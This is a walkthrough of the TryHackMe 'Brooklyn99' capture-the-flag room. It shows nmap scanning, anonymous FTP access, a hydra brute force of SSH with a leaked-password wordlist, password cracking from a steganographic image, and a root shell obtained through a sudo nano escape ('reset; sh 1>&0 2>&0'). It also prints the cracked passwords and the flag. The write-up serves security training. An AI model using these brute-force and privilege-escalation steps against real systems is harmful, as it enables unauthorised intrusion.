# Brooklyn99 @TryHackMe

Difficulty: EASY

Keywords and tools: nmap, steganography, hydra

### Check that host is alive
```                                                                            
$ ping <target_ip> 
PING 10.10.179.53 (10.10.179.53) 56(84) bytes of data.
64 bytes from 10.10.179.53: icmp_seq=1 ttl=63 time=109 ms
64 bytes from 10.10.179.53: icmp_seq=2 ttl=63 time=141 ms
```
### nmap scans
```
$nmap -sV -n -v -Pn -p- -T4 -A <target_ip>

Nmap scan report for 10.10.179.53
Host is up (0.086s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.155.124
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
We have a FTP running (with anon login), SSH and web application.

### Lets check FTP
```
$ftp <targetip>
220 (vsFTPd 3.0.3)
Name (10.10.179.53:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
ftp> get note_to_jake.txt

"From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine"
```
Possibly weak password for username "Jake"? Lets set hydra to bruteforce while we do other things.

### Run Hydra against SSH
```
hydra -l jake -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt 10.10.179.53 ssh -f  
[22][ssh] host: 10.10.179.53   login: jake   password: 987654321
```
And we found a password.

### SSH login
```
$ ssh jake@<target_ip>
jake@10.10.179.53's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ cd /root
-bash: cd: /root: Permission denied
jake@brookly_nine_nine:/$ cd /home
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
jake@brookly_nine_nine:/home$ cd amy
jake@brookly_nine_nine:/home/amy$ ls
jake@brookly_nine_nine:/home/amy$ cd /home/holt
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
jake@brookly_nine_nine:/home/holt$ cat nano.save 
cat: nano.save: Permission denied
jake@brookly_nine_nine:/home/holt$ cat user.txt 
```
user.txt contains our first flag.

### Run dirb
```
$ dirb http://10.10.179.53

---- Scanning URL: http://10.10.179.53/ ----
+ http://10.10.179.53/index.html (CODE:200|SIZE:718)                            
+ http://10.10.179.53/server-status (CODE:403|SIZE:277)    
```
Nothing found. Also running nikto wouldn't help us.

### Visit the web server via browser.
Viewing the source code, there's a comment:

!-- Have you ever heard of steganography? --

So maybe something hidden in the picture?

### Lets try stegcracker
```
$stegcracker brooklyn99.jpg  
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2021 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20523 passwords
Your file has been written to: brooklyn99.jpg.out
admin

$cat brooklyn99.jpg.out
Holts Password:
fluffydog12@ninenine

Enjoy!!
```
And we have password for user Holt. Let SSH with them.
```
$ ssh <target_ip>
holt@brookly_nine_nine:~$ cd /root
-bash: cd: /root: Permission denied
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
holt@brookly_nine_nine:~$ 
```
Lets check out https://gtfobins.github.io/gtfobins/nano/ for help

nano
^R^X
reset; sh 1>&0 2>&0

So as we are logged in SSH as holt. 

1. open nano as sudo. 

2. Press CTRL+r 

3. Press CTRL+x

4. Type reset; sh 1>&0 2>&0

5. Enter

```
Command to execute: reset; sh 1>&0 2>&0                                                                                                                       
# # et Help                                                                    ^X Read File
#  Cancel                                                                      M-F New Buffer
# 
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
# 
```

And there is the root flag.
